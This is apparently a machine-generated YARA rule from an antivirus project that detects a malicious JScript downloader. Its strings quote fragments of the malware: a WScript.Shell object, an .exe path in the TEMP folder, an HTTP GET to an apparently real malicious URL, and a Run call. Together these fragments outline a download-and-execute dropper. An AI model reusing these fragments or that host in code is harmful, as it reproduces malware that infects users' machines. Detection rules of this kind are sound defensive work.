rule sig_20160329_269ba5e6b601435b1a2b3af892f60b3a {
  meta:
    description = "datamaliciousorder - file 20160329_269ba5e6b601435b1a2b3af892f60b3a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c5ab7e1e389c44cf8638fcd262b1b561b01d6d7959be647e2c243d9514d7aaf3"

  strings:
    $s1  = "function zN() {return Ut[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ficRWcMv.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[f](W() * 11); if (z0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function Mx(T, li){z = z * 1; return T - li;};" fullword ascii
    $s4  = "var Ut = function ZE() {return WScript[n](\"WScript.Shell\");}(), b = 11;" fullword ascii
    $s5  = "z0[Bh](\"GET\", \"http://kingsstaging.consines.in/l9osaw\", false);" fullword ascii
    $s6  = "function MM(){return \"\" + o;};" fullword ascii
    $s7  = "function KR(J){Ut[\"Run\"](J, z, z);};" fullword ascii
    $s8  = "function iL() {return ((mu == true) && (mu == V)) ? 1 : z;};" fullword ascii
    $s9  = "function W(){return 22;};" fullword ascii
    $s10 = "function h()" fullword ascii
    $s11 = "var B = new this[\"Date\"]();" fullword ascii
    $s12 = " while (Qw){" fullword ascii
    $s13 = "return Mx(F, lL);" fullword ascii
    $s14 = "function SP(S) {var LU0 = (1, 2, 3, 4, 5, S); return LU0;};" fullword ascii
    $s15 = "function qh(){return n;};" fullword ascii
    $s16 = "mu = true; " fullword ascii
    $s17 = "V = true; " fullword ascii
    $s18 = "var V = false;" fullword ascii
    $s19 = "var J0 = false;" fullword ascii
    $s20 = "var mu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}